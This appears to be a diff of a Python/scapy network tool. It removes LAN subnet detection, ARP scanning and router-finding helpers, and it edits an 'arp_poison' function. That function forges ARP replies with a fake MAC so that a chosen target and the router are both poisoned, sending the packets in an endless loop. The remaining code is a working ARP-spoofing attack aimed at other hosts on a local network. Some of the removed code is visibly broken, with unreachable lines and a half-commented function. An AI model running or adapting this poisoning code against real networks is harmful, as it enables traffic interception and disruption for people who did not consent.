@@ -22,136 +22,6 @@ import ipaddress
 console = Console()
 #----------------------------------------------------------------------------------------------------------------------------------------------------------
 
-_BAD_IFACE_PREFIXES = ("lo", "docker", "br-", "veth", "virbr", "vboxnet", "vmnet", "zt", "wg")
-
-#avoid virtual/loopback interfaces unless unless needed
-def _iface_score(name: str) -> int:
-    if name.startswith(_BAD_IFACE_PREFIXES):
-        return 0
-
-    if name.startswith(("eth", "en", "wlan", "wl")):
-        return 3
-    return 1
-
-
-#----------------------------------------------------------------------------------------------------------------------------------------------------------
-
-#----------------------------------------------------------------------------------------------------------------------------------------------------------
-#find network's subnet
-def get_lan_subnet():
-    for iface in netifaces.interfaces():
-        addrs = netifaces.ifaddresses(iface)
-        if netifaces.AF_INET in addrs:
-            ipv4_info = addrs[netifaces.AF_INET][0]
-            ip = ipv4_info['addr']
-            netmask = ipv4_info['netmask']
-
-            # Skip loopback and /32 addresses
-            if ip.startswith("127.") or netmask == "255.255.255.255":
-                continue
-
-            network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
-            return str(network)
-    return None
-
-#Automated MAC Address
-def get_mac(ip):
-    arp_req = ARP(pdst = ip)
-    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_packet = broadcast / arp_req
-    answered, _ = srp(arp_packet, timeout = 2, verbose = 0)
-    devices = []
-    for sent, recieved in answered:
-        add_device = f"'ip': {recieved.psrc}, 'mac': {recieved.hwsrc}"
-        devices.append(add_device)
-        
-        
-    return None
-
-    print(len(devices))
-
-
-#----------------------------------------------------------------------------------------------------------------------------------------------------------
-
-#hostname resolver
-def resolve_hostname(ip):
-    try:
-        socket.gethostbyaddr(ip)
-    
-    except Exception as e:
-        return None
-
-#----------------------------------------------------------------------------------------------------------------------------------------------------------
-
-#ARP Request Scan
-def arp_scan():
-    ROUTER_INFO = None
-
-    subnet = get_lan_subnet()
-    if not subnet:
-        subnet = console.input("[yellow]Could not detect subnet automatically. Enter your subnet: ")
-
-    console.print(f"[green]Scanning subnet: {subnet}\n")
-
-    # Create table
-    table = Table(title="\n[!] ARP Scan Results [!]", title_style="blue", style = "blue",show_lines=True)
-    table.add_column("Hostname", style="green")
-    table.add_column("IP Address", style="green")
-    table.add_column("MAC Address", style="green")
-
-    arp = ARP(pdst=subnet)
-    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
-    packet = ether / arp
-
-    # Send packets
-    answered, _ = srp(packet, timeout=0.5, verbose=2)
-
-    with Live(table, refresh_per_second=2) as live:  # live updates
-        for sent, received in answered:
-            ip = received.psrc
-            mac = received.hwsrc
-            try:
-                host = socket.gethostbyaddr(ip)[0]
-            except socket.herror:
-                host = "unknown"
-
-            if ip.endswith(".1"):
-                ROUTER_INFO = (ip, mac)
-                table.add_row("[bold red]Router[/bold red]", ip, mac)
-            else:
-                table.add_row(host, ip, mac)
-
-            live.update(table)
-
-    if not ROUTER_INFO:
-        console.print("[red]Router not found in the scanned subnet.")
-
-    return ROUTER_INFO
-
-
-
-#----------------------------------------------------------------------------------------------------------------------------------------------------------
-# devices table
-
-# def render_devices_table(devices):
-    table = Table("Discovered Devices")
-
-    table.add_column("IP", style="green")
-    table.add_column("MAC", style= "green")
-    table.add_column("Hostname", style="bold green")
-
-    for device in devices:
-        ip = device.get("ip", "-")
-        mac = device.get("mac", "-")
-        hostname = device.get("hostname", "-")
-        table.add_row(ip, mac, hostname)
-
-    console.print(table)
-        
-
-#----------------------------------------------------------------------------------------------------------------------------------------------------------
-
-
 #ARP Poisoning Function for Target Only
 def arp_poison(target_ip, router_ip, router_mac):
 
@@ -161,7 +31,11 @@ def arp_poison(target_ip, router_ip, router_mac):
     if not target_mac:
         console.print(f"[red] Could not resolve MAC for {target_ip}")
         return 
+
+    #fake mac variable
     fake_mac = "00:11:22:33:44:55"  
+    
+    #ARP Broadcast Packet
     packet_for_target = Ether(dst=router_mac, src=fake_mac) / ARP(op=2, psrc=target_ip, hwsrc=fake_mac, hwdst=router_mac, pdst=router_ip)
     packet_for_router = Ether(dst=target_mac,src=fake_mac) / ARP(op=2, psrc=router_ip, hwsrc=fake_mac, hwdst=target_mac, pdst=target_ip)
     iface = conf.iface
@@ -169,8 +43,8 @@ def arp_poison(target_ip, router_ip, router_mac):
     console.print(f"[yellow]Poisoning {target_ip} and {router_ip}...")
     try:
         while True:
-            sendp(packet_for_target, iface=iface, verbose=0, count=50)  
-            sendp(packet_for_router, iface=iface, verbose=0, count=50)
+            sendp(packet_for_target, iface=iface, verbose=0, count=1)  
+            sendp(packet_for_router, iface=iface, verbose=0, count=1)
             time.sleep(2)
 
 
